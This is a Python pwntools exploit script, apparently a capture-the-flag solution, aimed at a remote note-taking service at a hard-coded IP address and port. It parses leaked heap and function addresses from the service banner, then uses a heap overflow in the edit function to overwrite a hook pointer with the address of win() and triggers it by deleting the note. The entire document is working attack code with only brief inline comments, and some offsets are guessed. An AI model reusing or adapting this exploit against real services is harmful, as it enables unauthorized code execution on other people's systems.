#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'

io = remote('212.2.250.33', 32384)

# Get addresses
banner = io.recvuntil(b'>')
print(banner.decode())

import re
heap = int(re.search(rb'heap\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
win = int(re.search(rb'win\(\)\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
hook = int(re.search(rb'hook\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)

log.success(f"heap: 0x{heap:x}")
log.success(f"win(): 0x{win:x}")
log.success(f"hook: 0x{hook:x}")

# The hook is at a fixed address in .bss
# We need to use heap overflow to write to it

# Calculate how many bytes from heap start to hook
# hook is in .bss at 0x404260
# heap is at runtime address

# Create a large note that we can overflow
size = 0x100
io.sendline(b'1')
io.sendlineafter(b':', str(size).encode())
# Create payload that overflows to hook
# We need to calculate the exact offset
payload = b'A' * size
io.sendlineafter(b':', payload)
io.recvuntil(b'>')

# Try editing with massive overflow
io.sendline(b'2')
io.sendlineafter(b':', b'0')
# Append data that will overflow
overflow_size = hook - (heap + 0x20)  # 0x20 is typical chunk header
if overflow_size > 0 and overflow_size < 0x10000:
    payload = b'B' * (overflow_size) + p64(win)
    io.sendlineafter(b':', payload[:0x3f0])  # Limit to max size
else:
    # Just try a large overflow
    payload = b'C' * 0x300 + p64(win) * 20
    io.sendlineafter(b':', payload[:0x3f0])

io.recvuntil(b'>')

# Delete to trigger hook
io.sendline(b'3')
io.sendlineafter(b':', b'0')

# Check output
try:
    output = io.recvall(timeout=2)
    print("\n" + "="*60)
    print(output.decode(errors='ignore'))
    print("="*60)
except:
    pass

io.close()
